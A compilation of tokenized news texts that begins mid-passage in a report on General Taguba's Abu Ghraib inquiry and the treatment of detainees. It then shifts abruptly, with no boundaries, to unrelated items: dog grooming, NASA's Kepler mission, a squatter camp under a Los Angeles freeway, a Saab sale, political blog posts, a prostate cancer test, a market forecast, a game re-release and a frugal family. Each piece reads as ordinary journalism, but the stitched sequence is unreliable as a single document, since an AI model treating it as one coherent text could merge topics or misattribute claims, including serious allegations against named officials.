“ When I asked him about his assignment , he says , ‘ I ’m a liaison officer for intelligence from Army headquarters in Iraq . ’ ” But in the course of three or four interviews with Jordan , Taguba said , he began to suspect that the lieutenant colonel had been more intimately involved in the interrogation process — some of it brutal — for “ high value ” detainees .
“ Jordan denied everything , and yet he had the authority to enter the prison ’s ‘ hard site ’ ” — where the most important detainees were held — “ carrying a carbine and an M9 pistol , which is against regulations , ” Taguba said .
Jordan had also led a squad of military policemen in a shoot - out inside the hard site with a detainee from Syria who had managed to obtain a gun .
( A lawyer for Jordan disputed these allegations ; in the shoot - out , he said , Jordan was “ just another gun on the extraction team ” and not the leader .
He noted that Jordan was not a trained interrogator . )
Taguba said that Jordan ’s “ record reflected an extensive intelligence background . ”
He also had reason to believe that Jordan was not reporting through the chain of command .
But Taguba ’s narrowly focussed mission constrained the questions he could ask .
“ I suspected that somebody was giving them guidance , but I could not print that , ” Taguba said .
“ After all Jordan ’s evasiveness and misleading responses , his rights were read to him , ” Taguba went on .
Jordan subsequently became the only officer facing trial on criminal charges in connection with Abu Ghraib and is scheduled to be court - martialled in late August .
( Seven M.P.s were convicted of charges that included dereliction of duty , maltreatment , and assault ; one defendant , Specialist Charles Graner , was sentenced to ten years in prison . )
Last month , a military judge ruled that Jordan , who is still assigned to the Army ’s Intelligence and Security Command , had not been appropriately advised of his rights during his interviews with Taguba , undermining the Army ’s allegation that he lied during the Taguba inquiry .
Six other charges remain , including failure to obey an order or regulation ; cruelty and maltreatment ; and false swearing and obstruction of justice .
( His lawyer said , “ The evidence clearly shows that he is innocent . ” )
Taguba came to believe that Lieutenant General Sanchez , the Army commander in Iraq , and some of the generals assigned to the military headquarters in Baghdad had extensive knowledge of the abuse of prisoners in Abu Ghraib even before Joseph Darby came forward with the CD .
Taguba was aware that in the fall of 2003 — when much of the abuse took place — Sanchez routinely visited the prison , and witnessed at least one interrogation .
According to Taguba , “ Sanchez knew exactly what was going on . ”
Taguba learned that in August , 2003 , as the Sunni insurgency in Iraq was gaining force , the Pentagon had ordered Major General Geoffrey Miller , the commander at Guantánamo , to Iraq .
His mission was to survey the prison system there and to find ways to improve the flow of intelligence .
The core of Miller ’s recommendations , as summarized in the Taguba report , was that the military police at Abu Ghraib should become part of the interrogation process : they should work closely with interrogators and intelligence officers in “ setting the conditions for successful exploitation of the internees . ”
Taguba concluded that Miller ’s approach was not consistent with Army doctrine , which gave military police the overriding mission of making sure that the prisons were secure and orderly .
His report cited testimony that interrogators and other intelligence personnel were encouraging the abuse of detainees .
“ Loosen this guy up for us , ” one M.P. said he was told by a member of military intelligence .
“ Make sure he has a bad night . ”
The M.P.s , Taguba said , “ were being literally exploited by the military interrogators .
My view is that those kids ” — even the soldiers in the photographs — “ were poorly led , not trained , and had not been given any standard operating procedures on how they should guard the detainees . ”
Surprisingly , given Taguba ’s findings , Miller was the officer chosen to restore order at Abu Ghraib .
In April , 2004 , a month after the report was filed , he was reassigned there as the deputy commander for detainee operations .
“ Miller called in the spring and asked to meet with me to discuss Abu Ghraib , but I waited for him and we never did meet , ” Taguba recounted .
Miller later told Taguba that he ’d been ordered to Washington to meet with Rumsfeld before travelling to Iraq , but he never attempted to reschedule the meeting .
If they had spoken , Taguba said , he would have reminded Miller that at Abu Ghraib , unlike at Guantánamo , very few prisoners were affiliated with any terrorist group .
Taguba had seen classified documents revealing that there were only “ one or two ” suspected Al Qaeda prisoners at Abu Ghraib .
Most of the detainees had nothing to do with the insurgency .
A few of them were common criminals .
Taguba had known Miller for years .
“ We served together in Korea and in the Pentagon , and his wife and mine used to go shopping together , ” Taguba said .
But , after his report became public , “ Miller did n’t talk to me .
He did n’t say a word when I passed him in the hallway . ”
Despite the subsequent public furor over Abu Ghraib , neither the House nor the Senate Armed Services Committee hearings led to a serious effort to determine whether the scandal was a result of a high - level interrogation policy that encouraged abuse .
At the House Committee hearing on May 7 , 2004 , a freshman Democratic congressman , Kendrick Meek , of Florida , asked Rumsfeld if it was time for him to resign .
Rumsfeld replied , “ I would resign in a minute if I thought that I could n’t be effective .
. . .
I have to wrestle with that . ”
But , he added , “ I ’m certainly not going to resign because some people are trying to make a political issue out of it . ”
( Rumsfeld stayed in office for the next two and a half years , until the day after the 2006 congressional elections . )
When I spoke to Meek recently , he said , “ There was no way Rumsfeld did n’t know what was going on .
He ’s a guy who wants to know everything , and what he was giving us was hard to believe . ”
Later that month , Rumsfeld appeared before a closed hearing of the House Defense Appropriations Subcommittee , which votes on the funds for all secret operations in the military .
Representative David Obey , of Wisconsin , the senior Democrat at the hearing , told me that he had been angry when a fellow subcommittee member “ made the comment that ‘ Abu Ghraib was the price of defending democracy . ’
I said that was n’t the way I saw it , and that I did n’t want to see some corporal made into a scapegoat .
This could not have happened without people in the upper echelon of the Administration giving signals .
I just did n’t see how this was not systemic . ”
Obey asked Rumsfeld a series of pointed questions .
Taguba attended the closed hearing with Rumsfeld and recalled him bristling at Obey ’s inquiries .
“ I do n’t know what happened ! ” Rumsfeld told Obey .
“ Maybe you want to ask General Taguba . ”
Taguba got a chance to answer questions on May 11th , when he was summoned to appear before the Senate Armed Services Committee .
Under - Secretary Stephen Cambone sat beside him .
( Cambone was Rumsfeld ’s point man on interrogation policy . )
Cambone , too , told the committee that he had n’t known about the specific abuses at Abu Ghraib until he saw Taguba ’s report , “ when I was exposed to some of those photographs . ”
Carl Levin , Democrat of Michigan , tried to focus on whether Abu Ghraib was the consequence of a larger detainee policy .
“ These acts of abuse were not the spontaneous actions of lower - ranking enlisted personnel , ” Levin said .
“ These attempts to extract information from prisoners by abusive and degrading methods were clearly planned and suggested by others . ”
The senators repeatedly asked about General Miller ’s trip to Iraq in 2003 .
Did the “ Gitmo- izing ” of Abu Ghraib — especially the model of using the M.P.s in “ setting the conditions ” for interrogations — lead to the abuses ?
Cambone confirmed that Miller had been sent to Iraq with his approval , but insisted that the senators were “ misreading General Miller ’s intent . ”
Questioned on that point by Senator Jack Reed , Democrat of Rhode Island , Cambone said , “ I do n’t know that I was being told , and I do n’t know that General Miller said that there should be that kind of activity that you are ascribing to his recommendation . ”
Reed then asked Taguba , “ Was it clear from your reading of the [ Miller ] report that one of the major recommendations was to use guards to condition these prisoners ? ”
Taguba replied , “ Yes , sir .
That was recommended on the report . ”
At another point , after Taguba confirmed that military intelligence had taken control of the M.P.s following Miller ’s visit , Levin questioned Cambone :
LEVIN : Do you disagree with what the general just said ?
CAMBONE : Yes , sir .
LEVIN : Pardon ?
CAMBONE : I do .
Taguba , looking back on his testimony , said , “ That ’s the reason I was n’t in their camp — because I kept on contradicting them .
I was n’t about to lie to the committee .
I knew I was already in a losing proposition .
If I lie , I lose .
And , if I tell the truth , I lose . ”
Taguba had been scheduled to rotate to the Third Army ’s headquarters , at Fort McPherson , Georgia , in June of 2004 .
He was instead ordered back to the Pentagon , to work in the office of the Assistant Secretary of Defense for Reserve Affairs .
“ It was a lateral assignment , ” Taguba said , with a smile and a shrug .
“ I did n’t quibble .
If you ’re going to do that to me , well , O.K .
We all serve at the pleasure of the President . ”
A retired four - star Army general later told Taguba that he had been sent to the job in the Pentagon so that he could “ be watched . ”
Taguba realized that his career was at a dead end .
Later in 2004 , Taguba encountered Rumsfeld and one of his senior press aides , Lawrence Di Rita , in the Pentagon Athletic Center .
Taguba was getting dressed after a workout .
“ I was tying my shoes , ” Taguba recalled .
“ I looked up , and there they were . ”
Rumsfeld , who was putting his clothes into a locker , recognized Taguba and said , “ Hello , General . ”
Di Rita , who was standing beside Rumsfeld , said sarcastically , “ See what you started , General ?
See what you started ? ”
Di Rita , who is now an official with Bank of America , recalled running into Taguba in the locker room but not his words .
“ Sounds like my brand of humor , ” he said , in an e-mail .
“ A comment like that would have been in an attempt to lighten the mood for General Taguba . ”
( Di Rita added that Taguba had “ my personal respect and admiration ” and that of Rumsfeld .
“ He did a terrific job under difficult circumstances . ” )
However , Taguba was troubled by the encounter , and later told a colleague , “ I ’m now the problem . ”
DENIABILITY
A dozen government investigations have been conducted into Abu Ghraib and detainee abuse .
A few of them picked up on matters raised by Taguba ’s report , but none followed through on the question of ultimate responsibility .
Military investigators were precluded from looking into the role of Rumsfeld and other civilian leaders in the Pentagon ; the result was that none found any high - level intelligence involvement in the abuse .
An independent panel headed by James R. Schlesinger , a former Secretary of Defense , did conclude that there was “ institutional and personal responsibility at higher levels ” for Abu Ghraib , but cleared Rumsfeld of any direct responsibility .
In an August , 2004 , report , the Schlesinger panel endorsed Rumsfeld ’s complaints , citing “ the reluctance to move bad news up the chain of command ” as the most important factor in Washington ’s failure to understand the significance of Abu Ghraib .
“ Given the magnitude of this problem , the Secretary of Defense and other senior DoD officials need a more effective information pipeline to inform them of high - profile incidents , ” the report said .
Schlesinger and his colleagues apparently were unaware of the early e-mail messages that had informed the Pentagon of Abu Ghraib .
The official inquiries consistently provided the public with less information about abuses than outside studies conducted by human - rights groups .
In one case , in November , 2004 , an Army investigation , by Brigadier General Richard Formica , into the treatment of detainees at Camp Nama , a Special Forces detention center at Baghdad International Airport , concluded that detainees who reported being sodomized or beaten were seeking sympathy and better treatment , and thus were not credible .
For example , Army doctors had initially noted that a complaining detainee ’s wounds were “ consistent with the history [ of abuse ] he provided .
. . .
The doctor did find scars on his wrists and noted what he believed to be an anal fissure . ”
Formica had the detainee reëxamined two days later , by another doctor , who found “ no fissure , and no scarring .
. . .
As a result , I did not find medical evidence of the sodomy . ”
In the case of a detainee who died in custody , Formica noted that there had been bruising to the “ shoulders , chest , hip , and knees ” but added , “ It is not unusual for detainees to have minor bruising , cuts and scrapes . ”
In July , 2006 , however , Human Rights Watch issued a fifty - three - page report on the “ serious mistreatment ” of detainees at Camp Nama and two other sites , largely based on witness accounts from Special Forces interrogators and others who served there .
Formica , asked to comment , wrote in an e-mail , “ I conducted a thorough investigation . . . and stand by my report . ”
He said that “ several issues ” he discovered “ were corrected . ”
His assignment , Formica noted , was to investigate a unit , and not to conduct “ a systematic analysis of Special Operations activities . ”
The Army also protected General Miller .
Since 2002 , F.B.I. agents at Guantánamo had been telling their superiors that their military counterparts were abusing detainees .
The F.B.I. complaints were ignored until after Abu Ghraib .
When an investigation was opened , in December , 2004 , General Craddock , Rumsfeld ’s former military aide , was in charge of the Army ’s Southern Command , with jurisdiction over Guantánamo — he had been promoted a few months after Taguba ’s visit to Rumsfeld ’s office .
Craddock appointed Air Force Lieutenant General Randall M. Schmidt , a straight - talking fighter pilot , to investigate the charges , which included alleged abuses during Miller ’s tenure .
“ I followed the bread - crumb trail , ” Schmidt , who retired last year , told me .
“ I found some things that did n’t seem right .
For lack of a camera , you could have seen in Guantánamo what was seen at Abu Ghraib . ”
Schmidt found that Miller , with the encouragement of Rumsfeld , had focussed great attention on the interrogation of Mohammed al - Qahtani , a Saudi who was believed to be the so - called “ twentieth hijacker . ”
Qahtani was interrogated “ for twenty hours a day for at least fifty - four days , ” Schmidt told investigators from the Army Inspector General ’s office , who were reviewing his findings .
“ I mean , here ’s this guy manacled , chained down , dogs brought in , put in his face , told to growl , show teeth , and that kind of stuff .
And you can imagine the fear . ”
At Guantánamo , Schmidt told the investigators , Miller “ was responsible for the conduct of interrogations that I found to be abusive and degrading .
The intent of those might have been to be abusive and degrading to get the information they needed .
. . .
Did the means justify the ends ?
That ’s fine .
. . .
He was responsible . ”
Schmidt formally recommended that Miller be “ held accountable ” and “ admonished . ”
Craddock rejected this recommendation and absolved Miller of any responsibility for the mistreatment of the prisoners .
The Inspector General inquiry endorsed Craddock ’s action .
“ I was open with them , ” Schmidt told me , referring to the I.G. investigators .
“ I told them , ‘ I ’ll do anything to help you get the truth . ’ ” But when he read their final report , he said , “ I did n’t recognize the five hours of interviews with me . ”
Schmidt learned of Craddock ’s reversal the day before they were to meet with Rumsfeld , in July , 2005 .
Rumsfeld was in frequent contact with Miller about the progress of Qahtani ’s interrogation , and personally approved the most severe interrogation tactics .
( “ This was n’t just daily business , when the Secretary of Defense is personally involved , ” Schmidt told the Army investigators . )
Nonetheless , Schmidt was impressed by Rumsfeld ’s demonstrative surprise , dismay , and concern upon being told of the abuse .
“ He was going , ‘ My God !
Did I authorize putting a bra and underwear on this guy ’s head and telling him all his buddies knew he was a homosexual ? ’ ”
The coat of the Miniature Australian Shepherd is easy to groom and needs little attention .
Brush occasionally with a firm bristle brush and bathe only when necessary .
This breed is an average shedder .
Origin
A breeding program to develop the Miniature Australian Shepherd ( North American Miniature Australian Shepherd ) was begun in 1968 using small Australian Shepherds .
Breeders bred them down in size to produce a smaller dog and today continue to strive to produce a mirror image of the Australian Shepherd in a size that fits well into today 's lifestyle , without sacrificing instinct , ability or character .
The major club in the US is the Miniature Australian Club of the United States of America .
MASCUSA , as the parent club , has petitioned the American Kennel Club for inclusion in AKC .
The process of acceptance into AKC starts with registration into the AKC Foundation Stock Service .
The Australian Shepherd Club of America has accepted the Miniature Australian Shepherd ONLY if the Miniature changes its name and has no reference of any kind to the Australian Shepherd or its history .
A lot of Miniature Australian Shepherd owners are registering with AKC FSS .
The AKC 's official name is Miniature American Shepherd .
NASA 's Kepler spacecraft has begun its search for other Earth - like worlds .
The mission , which launched from Cape Canaveral , Fla. , on March 6 , will spend the next three - and - a - half years staring at more than 100,000 stars for telltale signs of planets .
Kepler has the unique ability to find planets as small as Earth that orbit sun- like stars at distances where temperatures are right for possible lakes and oceans .
" Now the fun begins , " said William Borucki , Kepler science principal investigator at NASA 's Ames Research Center , Moffett Field , Calif .
" We are all really excited to start sorting through the data and discovering the planets . "
Scientists and engineers have spent the last two months checking out and calibrating the Kepler spacecraft .
Data have been collected to characterize the imaging performance as well as the noise level in the measurement electronics .
The scientists have constructed the list of targets for the start of the planet search , and this information has been loaded onto the spacecraft .
" If Kepler got into a staring contest , it would win , " said James Fanson , Kepler project manager at NASA 's Jet Propulsion Laboratory , Pasadena , Calif .
" The spacecraft is ready to stare intently at the same stars for several years so that it can precisely measure the slightest changes in their brightness caused by planets . "
Kepler will hunt for planets by looking for periodic dips in the brightness of stars -- events that occur when orbiting planets cross in front of their stars and partially block the light .
The mission 's first finds are expected to be large , gas planets situated close to their stars .
Such discoveries could be announced as early as next year .
Kepler is a NASA Discovery mission .
NASA Ames Research Center , Moffett Field , Calif. , is the home organization of the science principal investigator , and is responsible for the ground system development , mission operations and science data analysis .
JPL manages the Kepler mission development .
Ball Aerospace & Technologies Corp. of Boulder , Colo. , is responsible for developing the Kepler flight system and supporting mission operations .

To reach the secret place they call the Cave , its denizens must climb a ladder toward a small , hard - to - notice opening in the tall concrete slab that helps hold up the 10 Freeway .
They must squeeze beneath a rusty metal grating , balance on a ledge and descend a second ladder into thick , dead air and darkness .
This is home , a vast , vault - like netherworld , strewn with garbage and syringes .
Richard Dafoe likes it here , even with 3 - foot cobwebs and the constant thrum of freeway traffic overhead .
For the decade or so he has lived here , he has found it a reliable sanctuary against daylight , police and other people .
“ It ’s basically a safe place to be because the cops ca n’t get into it , ” said Dafoe , 56 , known as the Wizard for his ample white beard and wild hair .
“ They ’re scared . ”
About the size of two high school gyms placed side by side , the Cave is both an invisible squatter ’s camp and a shooting gallery for drug users .
The California Department of Transportation has tried repeatedly to seal it shut .
Police did n’t realize people were still living there until March , when a USC journalism student researching homelessness spotted the opening in the underpass near the San Gabriel River in Baldwin Park .

This week , authorities are clearing out the Cave , evicting the few people who live there and trying to close it off for good .
On Wednesday , as a team of deputies and Caltrans workers stood by in protective face masks , a circular saw began cutting away one of the metal doors along the north - facing wall , deemed the safest entrance .
Guns drawn , deputies stepped through the opening into the darkness .
Flashlight beams picked up mounds of scrap metal , bicycle parts , knives , syringes and an M - 16 ammo clip .
They found thick sections of concrete wall had been chiseled away to create little rooms .
They found a man sleeping near the rotting carcass of what appeared to be a cat .
Sheriff ’s Deputy Paul Archambault , who was leading the sweep , found a ladder and climbed up to inspect a series of overhead crawl spaces .

He pointed his flashlight .
“ It looks like a baby was living in here .
It looks like they had a nursery or something .
There ’s a bunch of rattles and toys and stuff , ” he said .
“ I think they put the babies up there to keep them away from the rats . ”
After the search , standing in the open air and the sunlight , he took off his mask and dripped sweat .
“ There were two nurseries , ” he said .
“ There was a dead cat in one of them .
It looked like they had skinned it and ate it .
They had a little barbecue set up .
It ’s just wicked in there . ”
He estimated that 30 squatters had been living there .
Archambault described it as “ a hidden city ” and said he had not seen anything like it in 27 years with the Sheriff ’s Department .

On Thursday , Caltrans engineers assessed the freeway ’s structure , and contractors hauled out piles of garbage .
Nearby , Dafoe was gathering up his belongings and stuffing them into a suitcase , wondering where he ’d go next .
“ Somewhere around here .
It ’s a big river , ” he said .
Wherever it is , he said , he prefers to stay out of public view .
“ I do n’t want people to feel uneasy because I ’m around , like kids , ” he said .
Dafoe , who describes himself as a former freight handler from Nebraska , said the baby paraphernalia found in the Cave is just bric - a - brac scavenged from recycling expeditions and that children have not lived there .
He said that only five people have been living there recently but that over the last decade or so , there have been dozens .

At nearby San Angelo Park , booths were set up to help homeless people find shelter .
Doctors checked vital signs , and hot dogs were distributed .
“ This is not to take away their home , this is to give a home , ” Sheriff ’s Department spokesman Steve Whitmore said .
Caltrans workers say they ’ve cleared out the Cave several times before , and that the freeway lights overhead are out because thieves have stolen the electrical wire , scavenging for copper to sell .
Don Griffiths , 47 , the Caltrans bridge crew chief for L.A. County , said he ’s helped clean out 30 or 40 hidden dungeons like this in the last 15 years .
“ I ’ve seen nastier ones , smellier ones , but this is the biggest one , ” he said .
Caltrans workers today will seal every opening they can find with quarter - inch sections of welded flat - plate steel .
Advertisement
“ Nothing ’s impregnable with these guys .
We do the best we can , ” Griffiths said .
“ They can steal a sledgehammer and beat on it all night long , and nobody can hear them . ”
Dafoe doubted that whatever Caltrans did to seal the Cave would be enough to keep people out .
In time , he ’d find another way in .
“ I do n’t say we ’re gonna go in right away , but it ’s gonna happen sooner or later , ” he said .
“ The only way they can keep people out of the Cave is by cementing the whole thing in . ”

Supercar maker Koenigsegg wants to buy its long - neglected , but quirky , neighbor Saab .
That would be the best thing to happen to the brand that 's not really born from jets since GM bought it in 1990 .

The three remaining bidders for Saab are Koenigsegg , billionaire Ira Rennert and Jim Press 's personal saviour , Fiat .
" According to sources close to GM the toughest battle is expected between U.S. billionaire Ira Rennert and Swedish carmaker Koenigsegg , " reports Swedish paper Dagens Industri , which goes on to state that Koenigsegg has lined up financing from a group of " very wealthy people . "

As former Saab enthusiasts , we 've got all our fingers and toes crossed for a Koenigsegg purchase .
The engineering know - how and enthusiasm of that brand might just be the only thing capable of restoring the Swedish automaker to its former glory as a maker of truly weird and wonderful cars .

So Congress is set to vote in a stunning , 90 % tax rate on bonuses paid out to TARP firms .
The logic :
If you screw up the economy , no windfall for you .
If the Democrats leading the charge had the stones , then they 'd apply this logic to the one man they blame for screwing the whole thing up : George W. Bush .
See , Dubya just signed a big ol ' book deal .
Crown publishers is paying him a $ 7 million advance to writing a book called Decision Points , all about what a decider he was .
Now the general wisdom is that Busch screwed things up .
Seriously , ask Pelosi , Rangel , Reed or Obama and they 'll give you a whole litany of things he did wrong to get us in this mess .
If you can tax AIG bonuses at a punitive rate , is there any reason not to tax Bush ?
Is there some special exemption for ex-Presidents that protect them against vindictive tax policy from current politicians ?
Not as far as we know .
Added :
As a commenter argues , the reason for taxing AIG employees like this is that they 've received support from the government .
Well , Bush 's whole windfall is based on his having a taxpayer - funded job for the last 8 years .
Without our money and his time spent working from the people 's White House , he could 've never gotten this book deal .
So the same logic applies , perfectly .
In fact , our own John Carney argued for this exact same thing last November .
He even called the 90 % rate :
Here 's how a tax directed at recapturing the public 's political earning power could work .
First , take the pre-public office salary of a politician , which we 'll call their " market value . "
Subtract that from the post - public office compensation .
Adjust for inflation .
The result should be the " political value . "
Why not tax that political value ?
Something like a 90 % tax seems about right .
There would be lots of positive externalities to the tax .
Politicians would have less incentive to cater to the demands of special interests since the financial rewards would far smaller .
Businesses would have to concentrate more on producing market value since gains from buying off politicians would be much more expensive .

It seems that Texas Governor Rick Perry , who is n’t well - loved by conservatives , and who is whispered to have his own Lindsey Graham problem , is now seeking to solidify his support in the next election ’s primary by sucking up to GOP leader Rush Limbaugh .
Not only does the GOP have a Limbaugh problem , but more generally , they have a conservative problem .
The party is beholden to the far right , and its national leadership is either all far right or , like Michael Steele , in mortal fear of crossing the far right .
Limbaugh is n’t the cause , he ’s the symptom , of the GOP ’s woes .
Their problem is n’t that they have Limbaugh , it ’s that they love Limbaugh .
A new blood test used in combination with a conventional prostate - specific antigen ( PSA ) screening sharply increases the accuracy of prostate cancer diagnosis , and could eliminate tens of thousands of unneeded , painful , and costly prostate biopsies annually , according to a study led by researchers at Dana - Farber Cancer Institute .
At the annual meeting of the American Society of Clinical Oncology in Orlando , Fla. , William K. Oh , M.D. , and Robert W. Ross , M.D. , will report that the six - gene molecular diagnostic test , when combined with a PSA test , accurately detected prostate cancer more than 90 percent of the time .
Earlier studies suggest that the conventional PSA test is 60 - 70 percent accurate in detecting cancer .
The findings will be discussed at a poster session on May 31 .
Men who are found to have elevated levels of PSA in routine screening tests are often referred for a biopsy of the gland to check for tumors .
Nearly two - thirds of biopsies performed -- a painful procedure with some risk of complications -- do not find any cancerous cells .
This high rate of " false positive " PSA test results underscores the need for a more accurate method for detecting prostate cancer , said Oh , who is the clinical director of the Lank Center for Genitourinary Oncology at Dana - Farber .
The two - year study involved 484 participants .
The group comprised 204 men with known prostate cancer , 110 men with benign prostatic hypertrophy ( BPH ) , and 170 healthy men in a control group .
( BPH can elevate PSA levels in the blood , which often leads to a biopsy to rule out prostate cancer . )
These groups were split into age - matched training and validation sets .
The researchers sought to measure the accuracy of a six - gene whole blood RNA transcript - based diagnostic test developed by Source MDx in Boulder , Colo. , both in terms of its sensitivity ( the ability to detect prostate cancer ) and specificity ( the ability to identify people who do n't have prostate cancer ) .
Source MDx researchers developed the test after initially working with a set of 174 candidate genes whose activity was compared in the different study groups .
They narrowed the pool down to just six genes that , as a group , were highly sensitive in predicting which patients had prostate cancer and which were normal .
The study found that " the six - gene model was more accurate than PSA alone at predicting cancer if you had it and no cancer if you didn't , " said Oh .
The test 's accuracy improved even more when PSA measurements were added .
Combined , the two tests achieved a diagnostic accuracy of more than 90 percent in specificity and sensitivity and eliminated most of the false - positives yielded by the PSA test .
Based on these findings , the researchers are planning to conduct a larger , multicenter clinical trial involving approximately 1,000 men to determine if the findings remain valid .
" These findings are very encouraging and suggest that this new test could spare tens of thousands of men from undergoing an unnecessary biopsy , " Oh said .
" However , until we can verify our findings , it is important to recognize that the PSA test , despite its limitations , is still the best test available for diagnosing prostate cancer at this time . "
The study was funded in part by Source MDx and a Prostate Cancer SPORE grant at Dana - Farber / Harvard Cancer Center .
NEW YORK ( Reuters ) - Longtime technical analyst Robert Prechter , who forecast the 1987 stock market crash , predicted this week that U.S. equities may plunge to half their lows hit in March as a deflationary depression bites .
Oil and U.S. Treasury bonds are also locked in long term bear markets , while corporate bond prices will plunge precipitously by next year as broad economy , banking system and company earnings sustain more damage from a financial crisis that ’s akin to the Great Depression , he said .
The U.S. S&P 500 stock index's .
SPX rebound by nearly 40 percent since it sagged to a 12 - year closing low of 676 points on March 9 is not sustainable , Prechter said in an interview with Reuters .
“ It ’s not the start of a new bull market , ” said Prechter , chief executive at research company Elliott Wave International in Gainesville , Georgia .
“ Our models are ( showing ) right now that it is a much bigger bear market than most people realize , something along the lines of 1929 - 1932 , ” he told Reuters in a wide ranging interview .
“ It ’s a very rare event , ” he added .
“ I think the next leg down will be at least as severe if not more severe than what we just experienced .
So you want to stay on the side of safety , ” he said .
As in his 2002 book “ Conquer the Crash , ” which warned of the dangers of a U.S. debt bubble and deflationary depression , Prechter continues to advocate safer cash proxies such as Treasury bills .
SEVEN MORE YEARS ?
Riskier assets such as commodities , corporate bonds , and stocks which are currently anticipating that the severe global economic downturn may be bottoming , are likely to have short lived intense rallies , but within an inexorable long - term decline that may last another seven years , he said .
As banks continue to accumulate losses and corporate earnings fall , “ the difficulties will probably last through about 2016 , ” he said .
“ There will be plenty of rallies along the way . ”
Oil may rally further from current levels just below $ 60 per barrel but the upside will be capped at about $ 80 per barrel as the commodity is locked in a long - term bear market , he said .
In July , U.S. crude oil hit a record peak above $ 147 per barrel and was just above $ 57 per barrel around noon on Thursday .
“ Deflation is coming , it ’s going to lead to a depression .
We ’re not at the bottom yet , ” Prechter said .
“ I think we are going to have bouts of deflation separated by recoveries . ”
Prechter also painted a bleak picture for commodities like silver and is largely unenthusiastic about gold , believing the precious metal made a major peak when it rose above $ 1,000 last year .
While gold may have already topped at above $ 1,000 an ounce in March 2008 , Treasury bond prices are likely to fall in a long term bear market , with huge government debt issuance being the main catalyst .
The benchmark U.S. 10 - year Treasury note yield , which moves inversely to its price , hit a five - decade low of 2.04 percent in mid-December .
“ People got very enamored with bonds and very enamored with gold and I do n’t like to be invested in markets that are over subscribed , ” Prechter said .
“ The Treasury ( Department ) has taken on so much bad debt ” at a time tax receipts are falling , that “ there will be a slow , but very steady change in the way people will view the U.S. government , ” said Prechter .
As a result , investors in Treasury notes and bonds will ultimately demand higher yields , he said .
The U.S. central bank will not be able to control the government bond market and prevent yields from rising , regardless of how much money the Fed uses to buy Treasuries , he added .
Next year , U.S. corporate bond prices will probably fall below their extreme price lows of December during the market panic of 2008 when investors fled riskier assets , he said .
“ Corporates in terms of price have the big wave down coming .
This has been a prequel , ” Prechter said .
“ Many corporations who ( now ) say we can borrow more money and take more risks : those are the ones who will get in trouble , ” he said .
“ Many municipalities will default , ” he added .
LucasArts planning Secret of Monkey Island re-release
LucasArts is resurrecting its seminal Monkey Island adventure game franchise with a re-release of The Secret Of Monkey Island on Xbox 360 .
A game titled " The Secret of Monkey Island - Special Edition " was revealed today through a posting on the German USK game ratings board .
Sources have also independently ( though unofficially ) confirmed the existence of the project to Adventure Gamers , and indicated that it will be a downloadable game on Xbox Live Arcade rather than a retail Xbox 360 release .
Official details are expected at the Electronic Entertainment Expo , which will be held on June 2 - 4 .
The Secret Of Monkey Island is the first game in the Monkey Island series , originally released on floppy disk in 1990 for Atari ST , Macintosh and PC .
It is unknown whether the Special Edition will feature up - scaled graphics or entirely new artwork to take advantage of the Xbox 360's High Definition resolution .
It appears LucasArts has recently taken a renewed interest in its older intellectual properties .
In February , LucasArts revealed that the upcoming Nintendo Wii action / adventure game Indiana Jones and the Staff of Kings would feature the adventure game classic Indiana Jones and the Fate of Atlantis in its entirety as an unlockable bonus .

FRUGAL FAMILY CHALLENGE FRUGAL FAMILY CHALLENGE SPECIAL REPORT :
Tips on trimming your budget for everyday expenses ; video Enlarge By Al Goldis for USA TODAY Gabrielle Wojtowicz , left , and her father Patrick feed animals on their 40 acres near Alma , Mich .
When the economy started to squeeze the Wojtowicz family , they gave up vacation cruises , restaurant meals , new clothes and high - tech toys to become 21st - century homesteaders .
Now Patrick Wojtowicz , 36 , his wife Melissa , 37 , and daughter Gabrielle , 15 , raise pigs and chickens for food on 40 acres near Alma , Mich .
They 're planning a garden and installing a wood furnace .
They disconnected the satellite TV and radio , ditched their dishwasher and a big truck and started buying clothes at resale shops .
PHOTO GALLERY : A survivalist family " As long as we can keep decreasing our bills , we can keep making less money , " Patrick says .
" We 're not saying this is right for everybody , but it 's right for us . "
Hard times are creating economic survivalists such as the Wojtowicz family who are paring expenses by becoming more self - sufficient .
Reviving " almost lost " skills and preparing for tough days make people feel more in control , says Charlotte Richert , consumer sciences educator for Oklahoma State University 's Extension Service in Tulsa County .
Karen Gulliver , MBA program chair at Argosy University in Eagan , Minn. , expects the movement to grow as the sour economy forces people to reassess priorities .
People are asking , " Do I really want to be 100 % vulnerable with no self - sufficiency skills if something happens ? " she says .
Some signs of the trend : • Stockpiling .
When the stock market drops , orders surge for freeze - dried food , survival kits and emergency supplies , says Nitro - Pak president Harry Weyandt .
One best seller : a $ 3,375 food reserve that feeds four people for three months .
• Gardening .
Sales of vegetable seeds and transplants are up 30 % from 2008 at W. Atlee Burpee , the USA 's largest seed company .
The National Gardening Association says 7 million more households will grow food this year than in 2008 — a 19 % rise .
A book on building root cellars is the top seller at Johnny 's Selected Seeds in Winslow , Maine , supervisor Joann Matuzas says .
• Canning .
Jarden Corp. says sales of its Ball and Kerr canning and preserving products are up more than 30 % from 2008 .
Sonya Staffan , owner of The Jam and Jelly Lady commercial cannery in Lebanon , Ohio , is offering twice as many classes this year .
• Sewing .
More people are learning to sew so they can mend clothes and make home décor , says Rachel Cohen , spokeswoman for SVP Worldwide , owner of sewing - products makers Singer and Husqvarna Viking .
• Relocating .
Steve Saltman , general manager of LandAndFarm.com , a national real estate company , says more customers want to " live simply in a less - expensive place . "
Jonathan Rawles of SurvivalRealty.com says more people moving to rural areas " are specifically worried about economic and social instability . "
Patrick Wojtowicz 's family decided to transform their lives when his paycheck began to shrink last year .
A truck driver , he was spending more time on the road , paying his own expenses while waiting for loads .
He disliked being away from home for weeks at a time and worried about losing his job .
Melissa Wojtowicz is self - employed and works from home .
Their dual paychecks allowed them to live comfortably , but they were n't satisfied , Patrick says .
" We would basically buy stuff to feel good , " he says .
" When that stuff stopped filling the voids we had , we started analyzing what it was that we were really missing .
We were missing being around each other . "
The Wojtowiczes made a list of the things they could give up if Patrick quit his job and they relied on Melissa 's income .
They already lived in a house on property Patrick inherited from his father a few years ago .
Gabrielle " put up enough resistance to qualify as being a teenager , " Patrick says , but soon she was reminding her parents to turn off lights to save electricity .
Steps such as that , and keeping the thermostat set on 63 degrees this winter , cut monthly electric bills from $ 300 to $ 150 , Patrick says .
He hunts deer and turkeys .
Instead of buying books and going to movies , they visit the library weekly .
For Christmas , they got canning gear so they can preserve the food they grow .
" The earn , spend , earn era has come to an end for us , " he says on truenorthfound .
blogspot.com , their blog .
" The idea of living a fuller , more satisfying life seems simple to us now .
...
Money , cash , credit , maybe they do n't matter .
